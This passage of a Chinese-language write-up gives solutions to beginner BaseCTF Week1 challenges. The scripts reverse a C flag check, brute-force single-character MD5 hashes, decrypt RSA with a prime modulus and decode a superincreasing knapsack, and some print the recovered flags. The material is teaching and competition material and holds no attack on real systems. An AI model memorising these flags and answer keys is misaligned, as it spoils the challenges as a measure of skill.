    unsigned char flag[] = "BaseCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}";

    int i;
    for (i = 0; i < 40; i++) {
        flag[i] = flag[i] * 17;
    }
    if (flag[0] != 98) {  /* 下标是从 0 开始的 */
        printf("CPU Error???\n");
        return 1;
    }

	int arr1[]={98, 113, 163, 181, 115, 148, 166,  43,   9,  95,
	165, 146,  79, 115, 146, 233, 112, 180,  48,  79,
	65, 181, 113, 146,  46, 249,  78, 183,  79, 133,
	180, 113, 146, 148, 163,  79,  78, 48, 231,77};
for(int j=0;j<sizeof(arr1)/sizeof(arr1[0]);j++){
	for(int i=0;i<=5000;i++){
		if(i%256==arr1[j]){ 
			if(i%17==0){
			printf("%c",i/17);	
				break;	
			}
		}
	}
}	

    return 0;
}
```

### [Week1] 你会算md5吗



```
import hashlib
output = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf']
for i in output:
    for j in range(32,127):
        my_md5=hashlib.md5()
        my_md5.update(chr(j).encode())
        if my_md5.hexdigest()==i:
            print(chr(j),end="")
            break

```

### [Week1] babyrsa

$$\phi(n)$$表示从1到n之间，有多少个数与n互素。

计算方法：排除掉不与n互素的数。

$$\phi(pq)=pq-p-q+1 = (p-1)(q-1)$$

这题n已经是素数了，1到n-1都与n互素，$$\phi(n)=n-1$$

```
from Crypto.Util.number import *
import gmpy2
n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323
e = 65537
c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832

phin = n-1
d = gmpy2.invert(e, phin)
m = pow(c, d, n)
print(long_to_bytes(m))
#b'BaseCTF{7d7c90ae-1127-4170-9e0d-d796efcd305b}'
```

### [Week1] babypack

```
简单的超递增序列（不懂的可以简单了解一下背包密码）
从尾开始遍历列表a，大于c就为0，小于等于c就为1，并且c要减去这个值
```

```
#BaseCTF{2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9}
from Crypto.Util.number import *
# a=
c=2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834
bin_m=""
for i in a:
    if c>=i:
        bin_m+="1"
        c=c-i
    else:
        bin_m+="0"
m=int(bin_m,2)
print(long_to_bytes(m))
```

